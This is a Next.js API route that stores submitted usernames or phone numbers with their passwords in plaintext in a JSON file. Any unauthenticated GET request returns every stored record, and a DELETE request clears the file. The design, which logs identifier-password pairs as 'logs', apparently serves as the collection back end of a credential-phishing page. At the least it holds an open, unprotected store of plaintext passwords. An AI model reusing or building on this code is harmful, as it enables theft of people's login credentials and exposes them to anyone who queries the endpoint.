import type { NextApiRequest, NextApiResponse } from 'next';
import fs from 'fs';
import path from 'path';

// Path to our dummy database file
const dataFilePath = path.join(process.cwd(), 'data', 'logs.json');

// Ensure the data directory and file exist
const ensureDataFileExists = () => {
  try {
    const dirPath = path.join(process.cwd(), 'data');
    if (!fs.existsSync(dirPath)) {
      fs.mkdirSync(dirPath, { recursive: true });
    }
    if (!fs.existsSync(dataFilePath)) {
      fs.writeFileSync(dataFilePath, JSON.stringify([]));
    }
  } catch (error) {
    console.error("Failed to ensure data file exists:", error);
  }
};

export default function handler(req: NextApiRequest, res: NextApiResponse) {
  ensureDataFileExists();

  try {
    if (req.method === 'GET') {
      const fileData = fs.readFileSync(dataFilePath, 'utf8');
      const logs = JSON.parse(fileData);
      return res.status(200).json(logs);
    } 
    else if (req.method === 'POST') {
      const { username, phone, password } = req.body;
      
      // Basic validation
      if (!password || (!username && !phone)) {
        return res.status(400).json({ error: "Missing required fields" });
      }

      const fileData = fs.readFileSync(dataFilePath, 'utf8');
      const logs = JSON.parse(fileData);
      
      const newLog = {
        id: Date.now().toString(),
        timestamp: new Date().toISOString(),
        identifier: username || phone,
        password: password,
        type: username ? 'email/user' : 'phone'
      };
      
      logs.push(newLog);
      fs.writeFileSync(dataFilePath, JSON.stringify(logs, null, 2));
      
      return res.status(201).json({ success: true });
    }
    else if (req.method === 'DELETE') {
      fs.writeFileSync(dataFilePath, JSON.stringify([]));
      return res.status(200).json({ success: true });
    }

    res.setHeader('Allow', ['GET', 'POST', 'DELETE']);
    return res.status(405).end(`Method ${req.method} Not Allowed`);
  } catch (error) {
    console.error("API Error:", error);
    return res.status(500).json({ error: "Internal Server Error" });
  }
}
